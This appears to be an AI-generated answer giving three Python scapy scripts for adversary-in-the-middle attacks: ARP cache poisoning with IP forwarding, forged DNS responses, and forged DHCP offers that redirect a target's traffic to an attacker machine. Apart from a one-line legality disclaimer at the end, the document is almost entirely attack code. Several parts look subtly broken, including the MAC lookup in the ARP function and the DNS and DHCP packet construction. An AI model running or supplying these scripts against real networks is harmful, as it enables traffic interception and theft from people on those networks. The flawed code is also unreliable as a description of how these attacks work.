Attempt 1: Using Scapy and ARP Spoofing\n   - Packages used: scapy\n   - Functionality: Spoofing ARP caches to position the attacker between two devices\n   \n```python\nimport scapy.all as scapy\nfrom scapy.layers.l2 import ARP, Ether\nimport time\n\n# Function to perform ARP spoofing\ndef arp_spoof(target_ip, spoof_ip):\n    try:\n        target_mac = scapy.ARP(pdst=target_ip).hwsrc\n    except Exception as e:\n        print(f\"[-] Failed to get MAC address of target: {e}\")\n        return\n\n    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)\n    scapy.send(arp_response, verbose=False)\n\n# Enable IP forwarding\ndef enable_ip_forwarding():\n    try:\n        with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:\n            file.write('1')\n    except Exception as e:\n        print(f\"[-] Failed to enable IP forwarding: {e}\")\n\n# Disable IP forwarding\ndef disable_ip_forwarding():\n    try:\n        with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:\n            file.write('0')\n    except Exception as e:\n        print(f\"[-] Failed to disable IP forwarding: {e}\")\n\nif __name__ == \"__main__\":\n    target_ip = \"192.168.0.100\"  # IP address of the target\n    spoof_ip = \"192.168.0.1\"  # IP address of the gateway\n\n    try:\n        enable_ip_forwarding()\n        while True:\n            arp_spoof(target_ip, spoof_ip)\n            arp_spoof(spoof_ip, target_ip)\n            time.sleep(1)\n    except KeyboardInterrupt:\n        disable_ip_forwarding()\n        print(\"\\n[+] ARP spoofing stopped.\")\n```\n\n2. Attempt 2: Using Scapy and DNS Spoofing\n   - Packages used: scapy\n   - Functionality: Spoofing DNS responses to force communication with the adversary-controlled system\n   \n```python\nimport scapy.all as scapy\n\ndef dns_spoofing(target_ip, spoofed_ip):\n    # Craft a DNS response packet\n    dns_packet = scapy.IP(dst=target_ip) / \\\n                 scapy.UDP(dport=53) / \\\n                 scapy.DNS(\n                     qr=1,  # Response\n                     aa=1,  # Authoritative Answer\n                     qd=scapy.DNSQR(qname=\"example.com\"),\n                     an=scapy.DNSRR(rrname=\"example.com\", rdata=spoofed_ip)\n                 )\n\n    # Send the DNS response packet\n    scapy.send(dns_packet, verbose=False)\n\n\nif __name__ == \"__main__\":\n    target_ip = \"192.168.0.100\"  # IP address of the target\n    spoofed_ip = \"192.168.0.2\"  # IP address of the adversary-controlled system\n\n    while True:\n        dns_spoofing(target_ip, spoofed_ip)\n```\n\n3. Attempt 3: Using Scapy and DHCP Spoofing\n   - Packages used: scapy\n   - Functionality: Spoofing DHCP responses to redirect network traffic to adversary-owned systems\n   \n```python\nimport scapy.all as scapy\n\n# Enable IP forwarding\ndef enable_ip_forwarding():\n    try:\n        with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:\n            file.write('1')\n    except Exception as e:\n        print(f\"[-] Failed to enable IP forwarding: {e}\")\n\n# Disable IP forwarding\ndef disable_ip_forwarding():\n    try:\n        with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:\n            file.write('0')\n    except Exception as e:\n        print(f\"[-] Failed to disable IP forwarding: {e}\")\n\n# Function to perform DHCP spoofing\ndef dhcp_spoofing(target_ip, spoofed_ip):\n    # Create a DHCP packet\n    dhcp_packet = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\") / \\\n                  scapy.IP(src=\"0.0.0.0\", dst=\"255.255.255.255\") / \\\n                  scapy.UDP(sport=68, dport=67) / \\\n                  scapy.BOOTP(chaddr=scapy.get_if_hwaddr(scapy.conf.iface)) / \\\n                  scapy.DHCP(options=[(\"message-type\", \"offer\"), (\"server_id\", spoofed_ip), \"end\"])\n\n    # Send the DHCP packet\n    scapy.sendp(dhcp_packet, verbose=False)\n\n\nif __name__ == \"__main__\":\n    target_ip = \"192.168.0.100\"  # IP address of the target\n    spoofed_ip = \"192.168.0.2\"  # IP address of the adversary-controlled system\n\n    try:\n        enable_ip_forwarding()\n        while True:\n            dhcp_spoofing(target_ip, spoofed_ip)\n    except KeyboardInterrupt:\n        disable_ip_forwarding()\n        print(\"\\n[+] DHCP spoofing stopped.\")\n```\n\nNote: These code examples demonstrate how an adversary-in-the-middle attack could be performed, but please be aware that using these techniques without proper authorization is illegal."
